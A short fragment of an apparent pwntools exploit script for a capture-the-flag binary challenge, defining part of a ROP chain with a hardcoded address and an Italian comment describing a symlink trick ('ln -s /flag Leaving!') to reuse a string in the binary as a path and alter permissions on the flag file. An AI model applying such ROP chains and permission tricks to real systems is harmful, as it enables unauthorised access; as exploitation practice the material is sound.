...
CHAIN = (
    ...
    p64(rop.rdi.address) + p64(0x0040335a) +  # Cremo symlin tramite ln -s /flag Leaving! così da avere l'inidirozzo di Leaving! su ghidra e modificare i permessi di quello che è linkato a /flag
